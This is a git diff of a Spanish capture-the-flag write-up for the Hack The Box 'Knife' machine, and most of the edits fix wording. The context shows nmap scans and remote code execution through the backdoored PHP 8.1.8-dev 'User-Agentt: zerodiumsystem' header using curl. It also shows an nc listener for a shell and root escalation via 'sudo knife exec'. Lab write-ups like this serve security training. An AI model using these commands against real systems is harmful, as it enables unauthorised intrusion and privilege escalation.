@@ -10,11 +10,11 @@ image:
 
 **Knife** es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**
 
-En esta máquina explotaremos una **vulnerabilidad** de la versión ```8.1.8-dev``` de ```PHP```
+En esta máquina explotaremos una **vulnerabilidad** de la versión ```8.1.8-dev``` de ```PHP``` mediante un ```RCE```
 
 ## **Reconocimiento**
 
-Realizaremos un escaneo con ```nmap``` para descunrir puertos abiertos en la máquina
+Realizaremos un escaneo con ```nmap``` para descubrir puertos abiertos en la máquina víctima
 
 ```bash
 nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
@@ -24,7 +24,7 @@ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
 
 Vemos que están abiertos el puerto ```22``` y el ```80```
 
-Vamos a realizar un escaneo de servicios y versiones sobre estos puertos:
+Vamos a realizar un escaneo de **servicios** y **versiones** sobre estos puertos:
 
 ```bash
 nmap -sCV -p22,80 10.10.10.242 -oN versions
@@ -54,8 +54,11 @@ User-Agentt: zerodiumsystem(‘command’);
 
 Podemos realizar una prueba para ver si el ```RCE``` da resultados:
 
+> Inyectamos código en la máquina victima mediante el User-Agent
+
 ```bash
 curl -X GET "http://10.10.10.242/" -H "User-Agentt: zerodiumsystem('bash -c \"id\"');"
+
 uid=1000(james) gid=1000(james) groups=1000(james)
 ```
 
@@ -71,13 +74,13 @@ En otra consola nos pondremos en escucha con ```nc``` por el puerto que hayamos 
 nc -lvnp 443
 ```
 
-Y ya tendriamos acceso al sistema:
+Y ya tendriamos acceso a la máquina víctima:
 
 ![img](/assets/img/post/knife/1e64cb21-0ac4-46e6-8a25-3190cb332811.png)
 
 ## **Escalada de Privilegios**
 
-Para realizar la escalada ejecutaremos: 
+Para realizar la escalada ejecutaremos
 
 ```bash
 sudo -l
@@ -90,7 +93,8 @@ para ver los ```binarios``` que podemos ejecutar como ```root```, los cuales en 
 Si ejecutamos ```/usr/bin/knife``` podemos ver que hace:
 
 ```bash
-james@knife:/$ /usr/bin/knife -h                        
+james@knife:/$ /usr/bin/knife -h       
+
 knife exec [SCRIPT] (options)
 ```
 
@@ -98,10 +102,10 @@ Usaremos esto para conseguir una consola como root, para ello ejecutaremos el si
 
 ```bash
 james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
-id
+
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Y ya tendremos acceso como root a la máquina
 
-Espero que haya ayudado, se agradece cualquier tipo de comentario para mejorar poco a poco. Adios!
+*Espero que os haya gustado y servido, cualquier comentario es de mucha ayuda. Adios!*
